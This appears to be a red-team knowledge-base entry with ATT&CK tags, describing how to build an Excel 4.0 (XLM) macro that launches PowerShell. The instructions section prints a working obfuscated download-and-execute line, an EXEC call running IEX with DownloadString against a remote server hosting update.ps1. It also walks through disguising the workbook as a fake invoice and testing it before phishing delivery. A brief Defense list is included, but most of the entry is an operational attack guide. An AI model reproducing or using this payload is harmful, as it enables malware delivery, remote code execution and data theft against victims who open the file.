---
id: 7f312416-8694-41ec-b053-7817652fe309
name: Execute-PowerShell-via-XLM-Macro-in-Excel
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:23.328265+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command and Scripting Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - '[[techniques/Scripting|T1064 - Scripting]]'
sub_techniques: []
tags:
  - '[[tags/Office - Attacks]]'
  - '[[tags/XLM Excel 4.0 - EXEC]]'
  - macro
  - powershell
  - execution
commands: []
platforms:
  - Windows
tools: []
validated: true
---

# Execute-PowerShell-via-XLM-Macro-in-Excel

## Summary

This procedure uses Excel 4.0 (XLM) macros to download and execute a PowerShell script from a remote server, bypassing traditional macro security controls and antivirus detection. By embedding an EXEC function in the XLM macro, attackers can achieve remote code execution when the victim opens and enables macros in the Excel file, making it effective for delivering payloads via phishing attachments.

## Description

Excel 4.0 macros, also known as XLM macros, are a legacy feature that predates VBA and can execute code with fewer restrictions in modern Excel versions. This technique leverages the EXEC function to invoke PowerShell directly, using obfuscated syntax to evade static analysis. The macro downloads the script via .NET WebClient and executes it inline with IEX (Invoke-Expression). This is particularly useful in environments where VBA macros are disabled but XLM remains enabled by default or via user interaction. The target environment is Windows systems with Microsoft Excel installed (versions 2007+), and success relies on the victim enabling content. Potential outcomes include further malware deployment, data exfiltration, or lateral movement, as the downloaded PowerShell script can perform arbitrary actions.

## Requirements

1. Access to a remote web server to host the PowerShell script (e.g., HTTP/HTTPS accessible from the victim's network).
2. Microsoft Excel installed on the target Windows machine (Excel 2007 or later supports XLM macros).
3. Victim must open the Excel file and enable macros/content (user interaction required).
4. Network connectivity from the victim to the attacker's server (no firewall blocks on common ports like 80/443).

## Defense

- Disable all macros by default in Excel via Group Policy (e.g., block VBA and XLM macros from the internet zone).
- Implement advanced email gateways and endpoint protection that scan for XLM macros and anomalous PowerShell executions (e.g., AMSI integration).
- Enable PowerShell logging (Module, ScriptBlock, and Transcription) to detect DownloadString and IEX usage.
- Use application whitelisting to restrict Excel from executing external processes or scripts.

## Objectives

1. Deliver and execute a remote PowerShell script on the victim's Windows machine without relying on VBA.
2. Evade detection by leveraging legacy XLM macros that may not trigger modern antivirus signatures.
3. Enable further post-exploitation actions, such as malware installation or data theft, via the executed script.

## Instructions

### Step 1: Prepare the Remote PowerShell Script

**Context**: Host a malicious PowerShell script on your controlled server. This script will be downloaded and executed by the macro. Ensure the script performs the desired actions (e.g., reverse shell, keylogger) and is accessible via HTTP/HTTPS.

Create and upload a file like `update.ps1` to your server at a URL such as `http://your-server.com/update.ps1`. Test accessibility from a similar network.

**Expected Output**: The script file is hosted and returns a 200 OK response when fetched via curl or browser.

### Step 2: Create the Excel Workbook with XLM Macro

**Context**: Open Microsoft Excel and insert the XLM macro to embed the execution logic. This step sets up the payload in the spreadsheet.

1. Open a new Excel workbook.
2. Go to the Developer tab (enable if hidden via File > Options > Customize Ribbon).
3. Select Visual Basic (Alt+F11), then insert a new module.
4. Switch to Excel 4.0 macro mode by recording a macro (Developer > Record Macro > Store in Personal Macro Workbook) or directly editing the sheet.
5. In the first sheet, enter the XLM macro code in cell A1 (or use the macro sheet).

**Code** ([[codes/XLM-Macro-for-PowerShell-Download-and-Execute]]):

```xlm
=EXEC("poWerShell IEX(nEw-oBject nEt.webclient).DownloAdStRiNg('http://10.10.10.10:80/update.ps1')")
=halt()
```

> This embeds the obfuscated PowerShell command within the EXEC function. The DownloadString method fetches the script, and IEX executes it. The halt() stops further macro execution to avoid errors.

**Expected Output**: The macro code appears in the sheet cells without syntax errors when viewed in formula bar.

### Step 3: Save and Obfuscate the Excel File

**Context**: Save the workbook in a format that preserves XLM macros and add basic obfuscation to reduce detection risk.

1. Save the file as an Excel 97-2003 Workbook (.xls) to ensure XLM compatibility (File > Save As > Excel 97-2003).
2. Optionally, rename sheets or add legitimate-looking content to blend in (e.g., fake invoice data).
3. Protect the workbook structure if needed (Review > Protect Workbook) but ensure macros can run.

**Expected Output**: A .xls file that, when reopened, prompts for macro enabling.

### Step 4: Test the Macro Execution

**Context**: Verify the payload works in a controlled environment before delivery.

1. Open the saved .xls file in Excel on a test Windows machine.
2. Enable content/macros when prompted (File > Enable Content).
3. Monitor network traffic (e.g., via Wireshark) for the download request to your server.
4. Check for PowerShell execution (Task Manager or logs) and script outcomes.

**Expected Output**: PowerShell process spawns, script downloads (visible in server logs), and any script actions (e.g., file creation) occur.

**Success Indicators**:
- No Excel errors on macro enable.
- HTTP request to your server for the .ps1 file.
- PowerShell execution logged or observed.
